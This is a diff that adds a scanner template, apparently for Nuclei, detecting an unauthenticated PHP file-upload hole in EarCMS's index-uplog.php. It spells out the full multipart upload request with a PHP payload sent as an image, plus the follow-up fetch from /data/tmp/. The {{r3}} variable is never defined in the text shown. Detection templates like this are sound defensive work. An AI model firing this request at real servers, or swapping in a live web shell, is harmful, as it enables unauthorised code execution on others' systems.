@@ -1,0 +1,48 @@
+id: poc-yaml-earcms-index-uplog-php-file-upload
+
+info:
+  name: poc-yaml-earcms-index-uplog-php-file-upload
+  author: sharecast
+  severity: critical
+  tags: xray-converted,fileupload,ct-416449
+  reference:
+    - https://zhuanlan.zhihu.com/p/81934322
+
+http:
+  - raw:
+      - |
+        POST /source/pack/upload/index-uplog.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rand_base(8)}}
+
+        ------WebKitFormBoundary{{rand_base(8)}}
+        Content-Disposition: form-data; name="time"
+        
+        {{r3}}
+        ------WebKitFormBoundary{{rand_base(8)}}
+        Content-Disposition: form-data; name="app"; filename="{{rand_base(8)}}.php"
+        Content-Type: image/jpeg
+        
+        <?php echo md5({{rand_int(1000, 9999)}});unlink(__FILE__);?>
+        ------WebKitFormBoundary{{rand_base(8)}}--
+        
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "php"
+  - raw:
+      - |
+        GET /data/tmp/{{r3}}.php HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
